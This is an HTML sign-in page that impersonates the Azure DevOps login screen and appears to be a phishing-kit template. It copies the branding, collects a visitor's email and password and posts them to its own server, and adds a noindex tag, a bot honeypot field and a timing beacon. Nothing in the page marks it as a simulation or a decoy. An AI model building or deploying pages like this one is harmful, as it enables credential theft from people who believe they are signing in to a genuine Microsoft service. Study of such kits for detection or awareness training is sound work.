<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="robots" content="noindex,nofollow">
<title>Sign in to your account</title>
<meta name="theme-color" content="#0078D7">
<meta name="referrer" content="strict-origin-when-cross-origin">
<link rel="icon" href="data:image/svg+xml,%3Csvg%20xmlns%3D%27http%3A//www.w3.org/2000/svg%27%20viewBox%3D%270%200%2064%2064%27%3E%3Crect%20width%3D%2764%27%20height%3D%2764%27%20rx%3D%2714%27%20fill%3D%27%230078D7%27/%3E%3Ctext%20x%3D%2732%27%20y%3D%2744%27%20font-family%3D%27Helvetica%2CArial%2Csans-serif%27%20font-size%3D%2734%27%20font-weight%3D%27700%27%20fill%3D%27%23fff%27%20text-anchor%3D%27middle%27%3EA%3C/text%3E%3C/svg%3E">
<link rel="apple-touch-icon" href="data:image/svg+xml,%3Csvg%20xmlns%3D%27http%3A//www.w3.org/2000/svg%27%20viewBox%3D%270%200%2064%2064%27%3E%3Crect%20width%3D%2764%27%20height%3D%2764%27%20rx%3D%2714%27%20fill%3D%27%230078D7%27/%3E%3Ctext%20x%3D%2732%27%20y%3D%2744%27%20font-family%3D%27Helvetica%2CArial%2Csans-serif%27%20font-size%3D%2734%27%20font-weight%3D%27700%27%20fill%3D%27%23fff%27%20text-anchor%3D%27middle%27%3EA%3C/text%3E%3C/svg%3E">
<meta property="og:title" content="Sign in to your account">
<meta property="og:site_name" content="Azure DevOps">
<style>
  body { margin:0;min-height:100vh;background:#f2f2f2;display:flex;
         align-items:center;justify-content:center;padding:24px;
         font-family:'Segoe UI',-apple-system,BlinkMacSystemFont,Roboto,Helvetica,Arial,
                     sans-serif;color:#1b1b1b; }
  .card { background:#fff;width:100%;max-width:440px;padding:44px;
          box-shadow:0 2px 6px rgba(0,0,0,.2);box-sizing:border-box; }
  .mark { margin:0 0 16px; }
  h1 { font-size:24px;font-weight:600;margin:0 0 16px; }
  .field { margin-bottom:16px; }
  .field label { display:block;font-size:15px;color:#1b1b1b;margin:0 0 6px; }
  .field input { width:100%;padding:6px 0;font-size:15px;border:0;
                 border-bottom:1px solid #666;outline:none;background:transparent;
                 box-sizing:border-box; }
  .field input:focus { border-bottom:2px solid #0078D7;padding-bottom:5px; }
  .links { font-size:13px;margin:18px 0 24px; }
  .links a { color:#0078D7;text-decoration:none;display:block;margin-bottom:8px; }
  .row { display:flex;justify-content:flex-end; }
  .btn { background:#0078D7;color:#fff;border:0;padding:8px 32px;font-size:15px;
         cursor:pointer;min-width:108px; }
  .btn:hover { background:#0067b8; }
  .foot { font-size:12px;color:#666;margin-top:28px;display:flex;gap:16px; }
  .foot a { color:#666;text-decoration:none; }
  .hp { position:absolute;left:-9999px;width:1px;height:1px;opacity:0; }
</style>
</head>
<body>
<div class="card">
  <div class="mark"><svg viewBox="0 0 223 40" width="223" height="40" role="img" aria-label="Azure DevOps"><text x="0" y="30" font-family="Arial,Helvetica,sans-serif" font-size="30" font-weight="700" fill="#0078D7" letter-spacing="-0.5">Azure DevOps</text></svg></div>
  <h1>Sign in</h1>
  <form method="POST" action="/">
    <div class="field">
      <label for="email">Email</label>
      <input id="email" name="email" type="email" placeholder="you@example.com" autocomplete="username" required>
    </div>
    <div class="field">
      <label for="password">Password</label>
      <input id="password" name="password" type="password" placeholder="Password" autocomplete="current-password" required>
    </div>
    <div class="links"><a href="#">No account? Create one!</a><a href="#">Forgot password?</a></div>
    <div class="row"><button class="btn" type="submit">Next</button></div>

  <input class="hp" type="text" name="hp_email" value="" tabindex="-1" autocomplete="off">
  <input type="hidden" name="_tpl" value="azuredevops">
  <input type="hidden" name="_ts" value="__TS__">

<script>
/* honeypot + human-timing beacon: if a bot autofills the hidden field we still
   record it, and we log how long the form was open (bot forms are instant). */
(function(){
  var t0 = Date.now();
  var f = document.querySelector('form');
  if(!f) return;
  f.addEventListener('submit', function(){
    var el = f.querySelector('input[name=_ts]');
    if(el) el.value = String(Date.now() - t0);
  });
})();
</script>
  </form>
  <div class="foot"><a href="#">Terms of use</a><a href="#">Privacy &amp; cookies</a></div>
</div>
</body>
</html>
